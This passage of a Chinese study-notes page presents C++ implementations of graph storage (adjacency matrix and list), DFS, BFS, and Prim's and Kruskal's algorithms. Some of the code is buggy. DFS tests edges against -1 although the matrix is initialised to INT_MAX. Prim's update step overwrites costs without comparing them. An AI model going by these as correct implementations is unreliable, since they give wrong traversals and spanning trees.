class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IFINITY INT_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">VertexType</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line">  <span class="comment">//  string label;</span></span><br><span class="line">&#125;VRType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">// 用于存储边的权重</span></span><br><span class="line">&#125; InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcCell</span>&#123;</span><br><span class="line">    <span class="type">int</span> adj;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcCell,AdjMatrix[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    VertexType vexs[MAX_VERTEX_NUM];<span class="comment">//顶点信息</span></span><br><span class="line">    AdjMatrix arcs;<span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;<span class="comment">//顶点数，边数</span></span><br><span class="line">    GraphKind kind;<span class="comment">//图种</span></span><br><span class="line">    </span><br><span class="line">&#125;MGraph;</span><br></pre></td></tr></table></figure><p>创建图：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creategraph</span><span class="params">(MGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;<span class="type">float</span> w;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入顶点数，弧数，图类型:&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="comment">//构造顶点向量</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;输入顶点名称:&quot;</span>;</span><br><span class="line">        cin&gt;&gt;G.vexs[i].id;</span><br><span class="line">       <span class="comment">// scanf(&quot;%d&quot;,&amp;G.vexs[i].id);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            G.arcs[i][j].adj=IFINITY;</span><br><span class="line">            G.arcs[i][j].info=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;输入邻接矩阵位置与权重:&quot;</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%f&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">        G.arcs[i][j].adj=w;</span><br><span class="line">        G.arcs[j][i].adj=w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><p>1.空间复杂度O($n^2$)</p><p>2.边或弧的插入和删除操作简单，但顶点的插入和删除操作不容易</p><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h4><p>对于每个顶点，建立一个单链表，存储该顶点的所有邻接顶点和信息·。</p><h5 id="对于无向图-1"><a href="#对于无向图-1" class="headerlink" title="对于无向图"></a>对于无向图</h5><p>第i个顶点的总度数为边链表的结点的个数</p><p>图的总度数为所有边链表的结点个数之和。</p><p>边数即所有边链表的结点个数之和的<strong>一半</strong></p><h5 id="邻接表的定义"><a href="#邻接表的定义" class="headerlink" title="邻接表的定义"></a>邻接表的定义</h5><p>邻接表分为两部分，边链表和顶点表</p><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vertextype</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line"> <span class="comment">//   string label;</span></span><br><span class="line">&#125;vertextype;</span><br><span class="line"><span class="comment">//边表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex; <span class="comment">//该弧指向的顶点位置</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArcNode</span> *nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="comment">//顶点表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vnode</span>&#123;</span><br><span class="line">    vertextype data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125;vnode,adjlist[MAX_VERTEX_NUM];</span><br><span class="line"><span class="comment">//邻接表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    adjlist vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125;ALGraph;</span><br></pre></td></tr></table></figure><p>创建图：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creatadilist</span><span class="params">(ALGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    ArcNode *s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        cin&gt;&gt;G.vertices[i].data.id;</span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cin&gt;&gt;i&gt;&gt;j;</span><br><span class="line">        s=(ArcNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ArcNode));</span><br><span class="line">        s-&gt;adjvex=j;</span><br><span class="line">        s-&gt;info=<span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;nextarc=G.vertices[i].firstarc;</span><br><span class="line">        G.vertices[i].firstarc=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><p>1.空间复杂度O(n+e)</p><p>2.容易找到任意一个顶点的第一个邻接点</p><h3 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h3><p>图的遍历指，从图的某一顶点出发，访问图中所有顶点，且每个顶点仅访问一次</p><h4 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h4><h5 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h5><p>1.首先访问图中某一个顶点$V_1$，以该点为出发点</p><p>2.任选一个与顶点$V_i$邻接的未被访问的顶点$V_j$，访问$V_j$</p><p>3.以$V_j$为新的出发点继续进行深度优先搜索</p><h5 id="算法概要"><a href="#算法概要" class="headerlink" title="算法概要"></a>算法概要</h5><p>输入：图G，初始访问顶点v;</p><p>输出：图G的深度优先搜索序列；</p><p>1.访问v</p><p>2.改变v的访问标志</p><p>3.任选一个与v相邻又没被访问的顶点w</p><p>4.从w开始继续进行深度优先搜索</p><p>算法实现：</p><p>这里用邻接矩阵实现算法，传入的visit[]数组全部置0</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(MGraph G, <span class="type">int</span> v, <span class="type">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    visited[v] = TRUE;</span><br><span class="line">    cout &lt;&lt; G.vexs[v].id;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> w = <span class="number">0</span>; w &lt; G.vexnum; w++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (G.arcs[v][w].adj != <span class="number">-1</span> &amp;&amp; !visited[w]) &#123;</span><br><span class="line">            <span class="built_in">DFS</span>(G, w, visited);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h4><h5 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h5><p>1.首先访问图中某一个指定的出发点$v_i$,</p><p>2.然后一次访问$v_i$的所有邻接点$v_{i1}$,$v_{i2}$,$v_{i3}$…</p><p>3.再依次以$v_{i1}$,$v_{i2}$,$v_{i3}$…为顶点访问各顶点未被访问的邻接点，依次类推，直到图中所有顶点均被访问</p><h5 id="算法概要-1"><a href="#算法概要-1" class="headerlink" title="算法概要"></a>算法概要</h5><p>输入：图G，初始访问结点v</p><p>输出：图G的广度优先搜索序列</p><p>1.设置辅助队列Q，访问节点v，修改v的标志，v入队列</p><p>2.while(队列非空){</p><p>​    出队列节点u</p><p>​    访问与u的所有节点</p><p>​    修改与u邻接的所有结点的标志，与u邻接的所有结点入队列</p><p>}</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">QNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(QNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(LinkQueue &amp;Q,<span class="type">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QueuePtr p=(QNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(LinkQueue &amp;Q,<span class="type">int</span> &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==Q.front)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        QueuePtr p;</span><br><span class="line">        p=Q.front-&gt;next;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">        Q.front-&gt;next=Q.front-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">            Q.rear=Q.front;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">LinkQueue Q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BFSTraVErse</span><span class="params">(ALGraph G,<span class="type">bool</span> visit[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        visit[v]=FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InitQueue</span>(Q);</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visit[v])&#123;</span><br><span class="line">            visit[v]=TRUE;</span><br><span class="line">            cout&lt;&lt;G.vertices[v].data.id;</span><br><span class="line">            <span class="built_in">EnQueue</span>(Q, v);</span><br><span class="line">            <span class="keyword">while</span>(!<span class="built_in">QueueEmpty</span>(Q))&#123;</span><br><span class="line">                <span class="type">int</span> u,w;</span><br><span class="line">                ArcNode *p;</span><br><span class="line">                <span class="built_in">DeQueue</span>(Q, u);</span><br><span class="line">                <span class="keyword">for</span>(p=G.vertices[u].firstarc;p!=<span class="literal">NULL</span>;p=p-&gt;nextarc)<span class="comment">//将取出的u结点遍历</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!visit[p-&gt;adjvex])</span><br><span class="line">                    &#123;</span><br><span class="line">                        w=p-&gt;adjvex;</span><br><span class="line">                        visit[w]=TRUE;</span><br><span class="line">                        <span class="built_in">EnQueue</span>(Q,w);</span><br><span class="line">                        cout&lt;&lt;G.vertices[w].data.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图的连通性问题"><a href="#图的连通性问题" class="headerlink" title="图的连通性问题"></a>图的连通性问题</h3><h4 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4><p>prim算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//该图输入为字符型顶点，权值为浮点数且不为0</span></span><br><span class="line"><span class="comment">//部分注释代码为调试函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcCell</span>&#123;</span><br><span class="line">    <span class="type">float</span> adj;      <span class="comment">//记录权值</span></span><br><span class="line">&#125;ArcCell,G[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    <span class="type">char</span> begin;</span><br><span class="line">    <span class="type">char</span> end;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    G arcs;</span><br><span class="line">    <span class="type">int</span> vexnum,arcsnum;</span><br><span class="line">    <span class="type">char</span> vex[MAX_VERTEX_NUM];</span><br><span class="line">    Edge edge[MAX_VERTEX_NUM];</span><br><span class="line">&#125;MGraph;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">V</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex;<span class="comment">//closedeg[i].adjvex记录的是，顶点i到U中最短边的点</span></span><br><span class="line">    <span class="type">float</span> lowcost;<span class="comment">//lowcost记录权值</span></span><br><span class="line">&#125;;</span><br><span class="line">V closedge[MAX_VERTEX_NUM];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Locatevex</span><span class="params">(MGraph G,<span class="type">char</span> u)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(G.vex[i]==u)&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateGraph</span><span class="params">(MGraph &amp;G)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">char</span> name;</span><br><span class="line">    <span class="type">float</span> w;</span><br><span class="line">    <span class="type">char</span> ii, jj;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;G.vexnum,&amp;G.arcsnum);<span class="comment">//输入顶点数和弧数</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;input name:&quot;;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;name);  <span class="comment">//输入顶点名称，按次存储在vex[]数组中，下标从0开始</span></span><br><span class="line">        G.vex[i]=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            G.arcs[i][j].adj=<span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.arcsnum;i++)&#123;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c %c %f&quot;</span>,&amp;ii,&amp;jj,&amp;w);</span><br><span class="line">        j=<span class="built_in">Locatevex</span>(G, ii);</span><br><span class="line">        k=<span class="built_in">Locatevex</span>(G, jj);</span><br><span class="line">        G.arcs[j][k].adj=w;</span><br><span class="line">        G.arcs[k][j].adj=w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showMatrix</span><span class="params">(MGraph G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            cout&lt;&lt;G.arcs[i][j].adj&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MiniSpanTree_P</span><span class="params">(MGraph G,<span class="type">char</span> u)</span></span>&#123;</span><br><span class="line">   <span class="comment">// getchar();</span></span><br><span class="line">    V closedge[G.vexnum];</span><br><span class="line">    <span class="type">int</span> t=<span class="built_in">Locatevex</span>(G,u);</span><br><span class="line">    <span class="type">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j!=t)&#123;</span><br><span class="line">            closedge[j]=&#123;t,G.arcs[t][j].adj&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        closedge[t].lowcost=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="comment">/*for(int c=0;c&lt;G.vexnum;c++)&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;closedge[c].adjvex&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        for(int c=0;c&lt;G.vexnum;c++)&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;closedge[c].lowcost&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl;*/</span></span><br><span class="line">        <span class="type">float</span> temp=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;            <span class="comment">//求k closedge最小值</span></span><br><span class="line">            <span class="keyword">if</span>(closedge[j].lowcost==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(closedge[j].lowcost&lt;temp)&#123;</span><br><span class="line">                    k=j;</span><br><span class="line">                    temp=closedge[j].lowcost;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;k&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,G.vex[closedge[k].adjvex]);</span><br><span class="line">        <span class="keyword">if</span>(i==G.vexnum<span class="number">-1</span>)&#123;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        closedge[k].lowcost=<span class="number">0</span>;</span><br><span class="line">        t=k;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!closedge[j].lowcost)&#123;</span><br><span class="line">                closedge[j].adjvex=t;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                closedge[j].adjvex=t;</span><br><span class="line">                closedge[j].lowcost=G.arcs[t][j].adj;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    MGraph G;</span><br><span class="line">    <span class="built_in">CreateGraph</span>(G);</span><br><span class="line">    <span class="built_in">showMatrix</span>(G);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;===============&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="type">char</span> index;</span><br><span class="line">    cin&gt;&gt;index;</span><br><span class="line">    <span class="built_in">MiniSpanTree_P</span>(G, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kruskal算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> src, dest;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寻找父节点</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">findParent</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parent[i] == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">findParent</span>(parent, parent[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并两个子树</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unionSets</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> xset = <span class="built_in">findParent</span>(parent, x);</span><br><span class="line">    <span class="type">int</span> yset = <span class="built_in">findParent</span>(parent, y);</span><br><span class="line">    parent[xset] = yset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kruskalMST</span><span class="params">(<span class="type">int</span> V, Edge edges[], <span class="type">int</span> E)</span> </span>&#123;</span><br><span class="line">    Edge result[V - <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; <span class="comment">// 用于结果数组的索引</span></span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>; <span class="comment">// 用于排序边的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对边按权重进行排序</span></span><br><span class="line">    <span class="built_in">sort</span>(edges, edges + E, [](Edge a, Edge b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a.weight &lt; b.weight;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> parent[V]; <span class="comment">// 用于检测环路</span></span><br><span class="line">    <span class="built_in">fill</span>(parent, parent + V, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; V - <span class="number">1</span> &amp;&amp; e &lt; E) &#123;</span><br><span class="line">        Edge nextEdge = edges[e++];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">findParent</span>(parent, nextEdge.src);</span><br><span class="line">        <span class="type">int</span> y = <span class="built_in">findParent</span>(parent, nextEdge.dest);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x != y) &#123;</span><br><span class="line">            result[i++] = nextEdge;</span><br><span class="line">            <span class="built_in">unionSets</span>(parent, x, y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出最小生成树的边和权重</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Edges in the Minimum Spanning Tree:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; V - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; result[i].src &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; result[i].dest &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; result[i].weight &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> V = <span class="number">4</span>; <span class="comment">// 顶点数</span></span><br><span class="line">    <span class="type">int</span> E = <span class="number">5</span>; <span class="comment">// 边数</span></span><br><span class="line">    Edge edges[] = &#123;</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">3</span>, 